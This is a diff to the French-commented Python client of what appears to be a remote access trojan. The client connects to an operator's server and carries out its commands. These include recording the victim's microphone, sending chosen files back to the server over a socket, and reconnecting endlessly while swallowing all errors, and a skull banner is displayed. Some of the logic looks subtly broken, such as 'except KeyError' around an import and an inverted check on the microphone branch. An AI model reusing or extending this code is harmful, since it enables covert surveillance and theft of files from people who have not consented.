@@ -2,12 +2,13 @@ import socket, os, subprocess, sys, re, platform, tqdm
 from datetime import datetime
 try:
     import pyautogui
+    import sounddevice as sd
 except KeyError:
     # On test si la cible dispose d'un dispositif d'affichage, pour le cas des server en console 
     pyautogui_imported = False
 else:
     pyautogui_imported = True
-import sounddevice as sd
+
 from tabulate import tabulate
 from scipy.io import wavfile
 import psutil, GPUtil
@@ -87,20 +88,22 @@ class Client:
         
         elif (match := re.search(r"recordmic\s*([a-zA-Z0-9]*)(\.[a-zA-Z]*)\s*(\d*)", command)):
             # Enregistrer le micro par defautpresent sur le poste 
-            audio_filename = match.group(1) + match.group(2)
-            try:
-                seconds = int(match.group(3))
-            except ValueError:
-                # Si aucune seconde fournis en parametre, prendre 10 seconde par default 
-                seconds = 10
-            output = self.record_audio(audio_filename, seconds=seconds)
+            if pyautogui_imported == False:
+                audio_filename = match.group(1) + match.group(2)
+                try:
+                    seconds = int(match.group(3))
+                except ValueError:
+                    # Si aucune seconde fournis en parametre, prendre 10 seconde par default 
+                    seconds = 10
+                output = self.record_audio(audio_filename, seconds=seconds)
+            else:
+                output = None 
 
         elif (match := re.search(r"download\s*(.*)", command)):
             # Recuperer le filename et envoyer si existe 
             filename = match.group(1)
             if os.path.isfile(filename):
-                if self.verbose == True: 
-                    output = f"Le fichier >>[{filename}]<< est envoyer "
+                output = f"Le fichier >>[{filename}]<< est envoyer "
                 self.send_file(filename)
             else:
                 output = f"Le fichier >>[{filename}]<< est introuvable ! "            
@@ -159,14 +162,12 @@ class Client:
         return output
 
     def receive_file(self, port=2023):
-        # Se connecter au serveur en utilisant un autre port 
         s = self.connect_to_server(custom_port=port)
-        # Reception du fichier envoyer 
         Client._receive_file(s, verbose=self.verbose)
                              
     def send_file(self, filename, port=2023):
         s = self.connect_to_server(custom_port=port)
-        Client._send_file(s, filename, verbose=self.verbose)
+        Client._send_file(s, filename)
     
     @classmethod
     def _receive_file(cls, s: socket.socket, buffer_size=4096,verbose=False):
@@ -194,21 +195,21 @@ class Client:
         s.close()
 
     @classmethod
-    def _send_file(cls, s: socket.socket, filename, buffer_size=4096, verbose=False):
+    def _send_file(cls, s: socket.socket, filename, buffer_size=4096):
+        # Recupere la taille du fichier envoyer 
         filesize = os.path.getsize(filename)
+        # Envoie du filename et du sizefile 
         s.send(f"{filename}{SEPARATOR}{filesize}".encode())
-        if verbose:
-            progress = tqdm.tqdm(range(filesize), f"Envoie de >>] {filename} [<< ",unit="B", unit_scale=True, unit_divisor=1024)
-        else:
-            progress = None
+        # Commencer l'envoie 
+        # Activer la barre de progression! Encore pour le kiFF :) :) :) :) ! AHHHHHHHHHHHHHH 
+        progress = tqdm.tqdm(range(filesize), f" [info] : Envoie >>[{filename}]<< ", unit="B", unit_scale=True, unit_divisor=1024)
         with open(filename, "rb") as f:
             while True:
                 bytes_read = f.read(buffer_size)
                 if not bytes_read:
                     break
                 s.sendall(bytes_read)
-                if verbose:
-                    progress.update(len(bytes_read))
+                progress.update(len(bytes_read))
         s.close()
 
     @classmethod
@@ -237,13 +238,20 @@ class Client:
         output += f"Processor: {uname.processor}\n"
         return output
 
+def printbanniere():
+    from os import system
+    from time import sleep
+    print(open('skull.txt').read())
+    system('cls')
+
 if __name__ == "__main__":
-    while 1: 
+    while 1:
+        printbanniere()
+        print(open("skull.txt").read())
         try : 
-            print(" Connexion au serveur ")
+            
             client = Client(SERVER_HOST, SERVER_PORT)
             client.start()
-    
         except KeyboardInterrupt as e : 
             try : 
                 conf = input(" Voulez-vous vraiment arretez le programme ? (O/N) -> ")
@@ -254,9 +262,9 @@ if __name__ == "__main__":
                     print("\n\n", "[ Vous avez quitter le programme :) ! ]".center(80,'~'))
                     exit(0)
                 else: 
-                    continue
-        except Exception as e : 
-            continue 
+                    continue 
+        except Exception as e: 
+            continue
 
 
 
